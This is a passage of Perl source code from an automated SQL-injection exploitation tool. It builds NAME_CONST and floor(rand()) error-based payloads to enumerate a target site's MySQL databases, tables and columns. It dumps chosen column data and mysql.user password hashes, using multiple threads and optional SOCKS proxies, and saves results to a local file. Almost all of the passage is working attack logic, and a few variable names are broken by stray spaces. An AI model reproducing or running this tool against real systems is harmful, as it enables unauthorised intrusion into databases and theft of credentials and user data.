$trl[$_] = threads->create(\&gets5050111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050111 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "schema_name" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.schemata" . $nc_plus . "limit" . $nc_plus . $num . ",1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
} # end DB
# tables from DB from schemata
if ($choice == 3) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
## ???-?? tables ? information_schema.schemata ##
$temp = "(select" . $nc_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "where" . $nc_plus . "table_schema=" . $choice1 . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1;
print FILE "-----------------------------------------\n";
print FILE "Tables in $choice: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Tables in $choice: $bd_num\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050222);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050222 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "table_name" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "where" . $nc_plus . "table_schema=" . $choice1 . $nc_plus . "limit" . $nc_plus . $num . ",1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
} # end tables from DB
# columns tables from tables from DB
if ($choice == 4) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$choice1 = ascii_to_hex $choice;
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
print "-----------------------------------------\n";
print "Enter the TABLE-name: ";
$choice2 = <STDIN>;
chomp $choice2;
if ($choice2 =~ m/-/imgs) {$choice2 = "`" . $choice2 . "`"}
$choice3 = ascii_to_hex $choice2;
print "TABLE-name: $choice2\n";
print "----------\n";
$temp = "(select" . $nc_plus . $sql_pref1 . "count(column_name)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.columns" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice3 . $nc_plus . "and" . $nc_plus . "table_schema=" . $choice1 . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$bd_num = $content;
$bd_num =~ m/ussr(.*?)ussr/img;
$bd_num = $1;
print FILE "-----------------------------------------\n";
print FILE "Columns in [$choice.$choice2]: $bd_num\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Columns in [$choice.$choice2]: $bd_num\n";
print "-----------------------------------------\n";
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5050333);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5050333 {
$| = 1;
while ($num<$bd_num) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "column_name" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.columns" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice3 . $nc_plus . "and" . $nc_plus . "table_schema=" . $choice1 . $nc_plus . "limit" . $nc_plus . $num . ",1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
} # end columns tables from tables from DB
if ($choice==5) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?????? ? information_schema.tables ##
$temp = "(select" . $nc_plus . $sql_pref1 . "count(table_name)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$url11 = $nc_start1 . $nc_midle1 . $nc_end;
$current = $url11;
$content = scan_url();
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/img;
$tab_num = $1-1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print "Tables in information_schema.tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in information_schema.tables - $1\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets112);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets112 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "table_name" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "limit" . $nc_plus . $num . ",1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
}#end 2
if ($choice==6) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$choice1 = ascii_to_hex $choice;
$temp = "(select" . $nc_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice1 . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
print "Database for $choice: $prefix\n";
print FILE "Database for $choice: $prefix\n";
$temp = "select" . $nc_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.columns" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice1;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$colum_number = $content;
$colum_number =~ m/ussr(.*?)ussr/img;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
$full_table_name = $prefix . "." . $choice;
print "Number of columns in " . $full_table_name . ": $colum_number\n";
print FILE "Number of columns in " . $full_table_name . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
print FILE "Columns in " . $full_table_name . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets113);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets113 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "column_name" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.columns" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice1 . $nc_plus . "limit" . $nc_plus . $num . ",1)" ;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
}# end 3
if ($choice==7) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
if ($full_table_name) {
print "-----------------------------------------\n";
print "Use last parsed table: $full_table_name ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
$table_name = $full_table_name;
print "Table: $table_name\n";
print "----------\n";
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table_name = $choice;
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
$temp = "(select" . $nc_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice1 . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $prefix . "." . $table_name;
}
print "Table: $table_name\n";
print "----------\n";
}
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table_name = $choice;
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
$temp = "(select" . $nc_plus . $sql_pref1 . "table_schema" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "information_schema.tables" . $nc_plus . "where" . $nc_plus . "table_name=" . $choice1 . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $prefix . "." . $table_name;
}
print "Table: $table_name\n";
print "----------\n";
}
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name = $choice;
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
print "Do you want add condition to sql-query?\n";
print "----------\n";
print "for example - where id=1 ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
print "-----------------------------------------\n";
print "Enter your condition here - only one condition, without 'where', '+' and quotes, example - id=1 :\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
$where = $choice;
# ?????????:
($con,$whe) = split(/=/,$where);
if($whe =~ m/[^0-9]/img) {$where = $con . "=" . ascii_to_hex $whe}
print "Your condition: [ where $where ]\n";
$condition=1;
} else {
$condition=0;
}
if ($condition==0) {
print "----------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$temp = "(select" . $nc_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . $table_name . $nc_plus . "limit" . $nc_plus . "0,1)";
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
## ?????? ?????? ?? ??????? ##
for(0..$thr) {
$trl[$_] = threads->create(\&gets114);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets114 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $nc_plus . "from" . $nc_plus . $table_name . $nc_plus . "limit" . $nc_plus . $num . ",1)" ;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
} else {
## ?????? ?????? ?? ??????? ##
print "Count data from [ $table_name ] with [ where " . $where . " ] \n";
$temp = "select" . $nc_plus . $sql_pref1 . "count(*)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . $table_name . $nc_plus . "where" . $nc_plus . $where;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " with [ where " . $where . " ] (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
$url18 = $sql_start . $sql_CP_start . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . $table_name . $plus . "where" . $plus . $where;
for(0..$thr) {
$trl[$_] = threads->create(\&gets115);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets115 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$temp = "(select" . $nc_plus . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $nc_plus . "from" . $nc_plus . $table_name . $nc_plus . "where" . $nc_plus . $where . $nc_plus . "limit" . $nc_plus . $num . ",1" ;
$nc_start1 = $nc_start . $temp;
$nc_midle1 = $nc_midle . $temp;
$current = $nc_start1 . $nc_midle1 . $nc_end;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START200;
}
}# end 4
if ($choice == 8) {goto START}
} #end name_const
################################################## ######
# floor(rand())
if ($choice == 12) {
if ($f_url =~ m/^https:\/\/?([^\/]+)/i) {
$host13 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host13;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
START2001:
print "-------------------------------------------------------------------\n";
print " Choose mode:\n";
print "-------------------------------------------------------------------\n";
print " [1] floor(rand()) - system information\n";
print " [2] floor(rand()) - get DB-names from information_schema.schemata\n";
print " [3] floor(rand()) - get tables from DB-name\n";
print " [4] floor(rand()) - get column_name from tables from DB-name\n";
print " [5] floor(rand()) - get tables from information_schema (current DB)\n";
print " [6] floor(rand()) - get column_name from table (current DB)\n";
print " [7] floor(rand()) - get data from columns\n";
print " [8] floor(rand()) - Mysql4 inj brute tables and columns\n";
print "-------------------------------------------------------------------\n";
print " [9] Main menu\n";
print "-------------------------------------------------------------------\n";
if($sql_flag == 0){
$ff_url = $f_url;
} elsif ($sql_flag == 1) {#POST
$ff_url = $sql_post;
} elsif($sql_flag == 2){#HEADER
$ff_url = $sql_header;
}
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice==1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
#### ?????? ?????? ################################################## ###
$url1 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? ??? ???? ################################################## ###
$url2 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x626173653a,database())" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? ????? ################################################## ###
$url3 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x757365723a,user()" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? @@basedir ################################################## ###
$url4 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x626173656469723a," . "@@" . "basedir)" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? @@datadir ################################################## ###
$url5 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x646174616469723a," . "@@" . "datadir)" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? @@tmpdir ################################################## ###
#$temp = $sql_pref1 . "concat(0x746d706469723a," . "@@" . "tmpdir)" . $sql_pref2;
$url6 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x746d706469723a," . "@@" . "tmpdir)" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? @@version_compile_os ################################################## ###
#$temp = $sql_pref1 . "concat(0x6f733a," . "@@" . "version_compile_os)" . $sql_pref2;
$url7 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x6f733a," . "@@" . "version_compile_os)" . $sql_pref2 . $f_plus . "from" . $f_plus . $f_table . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? mysql.user ################################################## ###
$url8 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x6d7973716c2e757365723a,user)" . $sql_pref2 . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? mysql.password ################################################## ###
$url9 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x6d7973716c2e70617373776f72643a,password)" . $sql_pref2 . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
#### ?????? file_priv ################################################## ###
#$temp = "(select" . $nc_plus . $sql_pref1 . "concat(0x66696c655f707269763a,file_priv)" . $sql_pref2 . $nc_plus . "from" . $nc_plus . "mysql.user" . $nc_plus . "where" . $nc_plus . "user=user)";
$url10 = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "concat(0x66696c655f707269763a,file_priv)" . $sql_pref2 . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "where" . $f_plus . "user=user" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . "mysql.user" . $f_plus . "where" . $f_plus . "user=user" . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
################################################## ###################
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "SQL: $url1\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets111000);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets111000 {
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$ url9,$url10,$url11);
$size = @array; #???????? ?????? ???????
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $array[$num];
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $array[$num];
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
$sql_header_query = $array[$num];
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
}
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;
$current="";
$content="";
$sql_post="";
$sql_header_query="";
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START2001;
}#end 1
# DB from schemata
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?? ? information_schema.schemata ##
if($sql_flag == 0){
$current = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(schema_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $f_url;
$sql_post = $ff_url . "(select". $f_plus . "count(0),concat((select" . $f_plus . $sql_pref1 . "count(schema_name)" . $sql_pref2 . $f_plus . "from" . $f_plus . "information_schema.schemata" . $f_plus . "limit" . $f_plus . "0,1),floor(rand(0)*2))" . $f_plus . "from" . $f_plus . $f_table . $f_plus . "group" . $f_plus . "by" . $f_plus . "2" . $f_plus . "limit" . $f_plus . "0,1)" . $f_filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $f_url;
